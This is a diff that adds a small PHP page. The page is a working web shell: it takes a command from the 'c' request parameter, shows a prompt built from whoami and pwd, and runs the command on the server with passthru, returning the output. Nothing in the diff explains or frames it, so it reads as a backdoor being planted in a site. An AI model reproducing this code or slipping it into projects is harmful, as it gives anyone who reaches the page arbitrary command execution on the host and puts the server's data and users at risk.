@@ -1,0 +1,15 @@
+<html>
+
+<?
+$c=$_GET['c'];
+
+echo "
+<form action=\"$PHP_SELF\" method=\"POST\">
+[".exec("whoami")."@$SERVER_NAME ".exec("pwd")."] \$ <input size=22 type=text name=c value='$c'><br><br>
+<font face='Lucida Console, Courier'><pre>";
+if ($c)	passthru($c." 2>&1"); ?>
+
+</form>
+</pre>
+</html>
+
